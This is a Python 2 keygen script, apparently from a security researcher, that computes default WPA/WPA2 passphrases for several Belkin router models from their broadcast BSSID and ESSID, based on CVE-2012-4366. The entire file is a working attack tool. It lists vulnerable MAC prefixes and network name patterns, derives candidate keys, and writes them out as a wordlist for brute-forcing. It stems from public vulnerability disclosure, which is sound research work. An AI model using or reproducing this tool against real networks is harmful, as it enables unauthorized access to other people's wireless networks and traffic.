#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@license: GPLv3
@author : Eduardo Novella  
@contact: ednolo[a]inf.upv.es Twitter: @enovella_ 

-----------------
[*] References : 
-----------------
            [0] PDF by NumLock:  http://ednolo.alumnos.upv.es/papers/wifi/BELKIN_WPA_algorithm.pdf
                                 https://forums.kali.org/showthread.php?18943-Belkin-SSID-and-WPA-WPA2-correlation
            [1] CVE-2012-4366 :  Insecure default WPA2 passphrase in multiple Belkin wireless routers
                                 http://www.jakoblell.com/blog/2012/11/19/cve-2012-4366-insecure-default-wpa2-passphrase-in-multiple-belkin-wireless-routers/
            
            [2] Bruteforce by using oclHashcat : http://ednolo.alumnos.upv.es/?p=1686
                                                 https://www.youtube.com/watch?v=iyJIwr6Ca3U
            [3] CVE-2012-6371: Insecure default WPS pin in some Belkin wireless routers
                               http://ednolo.alumnos.upv.es/?p=1295
----------------         
[*] Algorithm : 
----------------
If : wanmac = wifimac+1
(+) Cases:
1.- ESSID: Belkin.XXXX    MAC: 94:44:52:XX:XX:XX                     CHARSET-macwifi   MODEL: F7D1301 F7D3302 F7D3402 F7D4301 F7D7301
2.- ESSID: Belkin_XXXXXX  MAC: 08:86:3B:XX:XX:XX                     CHARSET-macwifi   MODEL: F5D7234-4
3.- ESSID: belkin.xxxx    MAC: 94:44:52:XX:XX:XX                     charset-wanmac    MODEL: F7D2301 F7D4402 F7D5301 F7D8301
4.- ESSID: belkin.xxx     MAC: 08:86:3B:XX:XX:XX  EC:1A:59:XX:XX:XX  charset-wanmac*   MODEL: F9J1102 F9J1105 F9K1001 F9K1002 F9K1003 F9K1004 F9K1105

* Special case order = 
where wanmac =  wlanmac +2 ==> [6,2,3,8,5,1,7,4]
where wanmac =  wlanmac +1 ==> [ ,2,3,8,5,?,7,4]   ? = 1 = 6

----------------
[*] CHANGELOG:
----------------
1.5   [2014-05-09] Bruteforce function more readable
1.4   [2014-05-06] Fixed an exception with only -a as parameter, remove "ghost model"(F9J1101) and leave out ORDER_3
1.3   [2014-04-04] Fixed an exception with bssids like larger or equal than FF:FF:FF:FF:FF:FE
1.2   [2014-04-01] Added extra keys when it's being used flag -allkeys, fixed file writing  when -a is not activated
1.1   [2014-03-31] Delete duplicate keys. New order
1.0   [2014-03-29] First version. 
'''

import re
import sys
import argparse

ORDER_0  = [6,2,3,8,5,1,7,4]
ORDER_1  = [1,2,3,8,5,1,7,4]
ORDER_2  = [1,2,3,8,5,6,7,4]
#ORDER_3  = [6,2,3,8,5,6,7,4] # Out after v1.4

CHARSET  = '024613578ACE9BDF'
charset  = '944626378ace9bdf'

charsets = [CHARSET,charset]
orders   = [ORDER_0,ORDER_1,ORDER_2]
KEYS     = []

def generateKey(wmac,charset=charset,order=ORDER_0):
    try:
        k = ''.join([wmac[order[i]-1] for i in xrange(len(wmac))])
        return ''.join([charset[int(c,16)] for c in k])
    except IndexError:
        sys.exit("[!] Use real bssids :)")
        
def printTargets():
    print "[+] Possible vulnerable targets so far:"
    print ""
    for e in essids:
        print "\t essid: {0:s}".format(e)
    print ""
    for t in targets:
        print ("\t bssid: {0:s}:uv:wx:yz ".format(t.upper()))
    
def addOneToMac(mac): 
    return "%012X" %(int(mac,16)+1)

def printUniqueKeys(output=sys.stdout):
    for k in set(KEYS):
        output.write(k+"\n")

def bruteforce(mac,output=sys.stdout,wordlist=False):     
    for i in xrange(3):
        for c in charsets:
            for o in orders:
                KEYS.append(generateKey(mac[4:], c, o)) 
        mac = addOneToMac(mac)

    if (wordlist):
        printUniqueKeys(output)
    else:
        printUniqueKeys()


if __name__ == '__main__':
    global targets
    version     = ' 1.5   [2014-05-09]' 
    targets     = ['94:44:52','08:86:3B','EC:1A:59']
    essids      = ['Belkin.XXXX','Belkin_XXXXXX','belkin.xxxx','belkin.xxx']    
                  
    
    parser = argparse.ArgumentParser(description='''>>> Keygen for WiFi routers manufactured by Belkin. 
                                                 So far only WiFi networks with essid like Belkin.XXXX, Belkin_XXXXXX, 
                                                 belkin.xxx and belkin.xxxx are likely vulnerable, although routers using those
                                                 macaddresses could be vulnerable as well.
                                                 Twitter: @enovella_  and   email: ednolo[at]inf.upv.es''',
                                                 epilog='''(+) Help: python  %s -b 94:44:52:00:C0:DE -e Belkin.c0de''' %(sys.argv[0])
                                    )
   
    maingroup = parser.add_argument_group(title='required')
    maingroup.add_argument('-b','--bssid', type=str, nargs='?', help='Target bssid')
    maingroup.add_argument('-e','--essid', type=str, nargs='?', help='Target essid. [BelkinXXXX,belkin.XXXX]')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s'+version)
    parser.add_argument('-w','--wordlist', type=argparse.FileType('w'), nargs='?', help='Filename to store keys',default=sys.stdout)
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-a','--allkeys', action="store_true",  help='Create all possible cases. Definitely recommended if first attempt fails')
    command_group.add_argument('-l','--list', help='List all vulnerable mac address so far', action='store_true')
    
    args = parser.parse_args()

    if args.list:
        printTargets()
    else:
        try:
            mac = re.sub(r'[^a-fA-F0-9]', '', args.bssid)
            if (len(mac)!=12):
                sys.exit("[!] Your bssid length looks wrong")
        except Exception:
            sys.exit("[!] Check out -h or --help")
        if (args.allkeys):
            try:
                if (args.wordlist.name == '<stdout>'):
                    print '[+] Your WPA keys might be :'
                    bruteforce(mac)
                elif (args.wordlist.name != '<stdout>'):
                    bruteforce(mac,output=args.wordlist,wordlist=True)
            except Exception:
                sys.exit("[!] Check the filename")
        elif (not args.essid):
            sys.exit("[!] Did you forget the -e parameter?")   
        elif (args.bssid and args.essid):       
            if (args.essid.startswith('B')):   # CHARSET-macwifi 
                KEYS.append(generateKey(mac[4:],CHARSET))
            elif (args.essid.startswith('b')): # charset-wanmac
                mac = addOneToMac(mac)
                if (mac.startswith('944452')):
                    KEYS.append(generateKey(mac[4:],charset))
                else:
                    ''' special case: charset-wanmac != order &&  charset-wanmac+1 '''
                    KEYS.append(generateKey(mac[4:],charset))
                    KEYS.append(generateKey(mac[4:],charset,ORDER_2))
                    mac = addOneToMac(mac)
                    KEYS.append(generateKey(mac[4:],charset))
            else:
                sys.exit("[!] Your essid should start with B or b")
            try:
                if (args.wordlist.name == '<stdout>'):
                    print '[+] Your WPA key might be :'
                    printUniqueKeys()
                elif (args.wordlist.name != '<stdout>'):     
                    printUniqueKeys(args.wordlist)                
            except Exception:
                sys.exit("[!] Forgot the filename?")
        else:
            sys.exit("[!] Check out -h or --help")

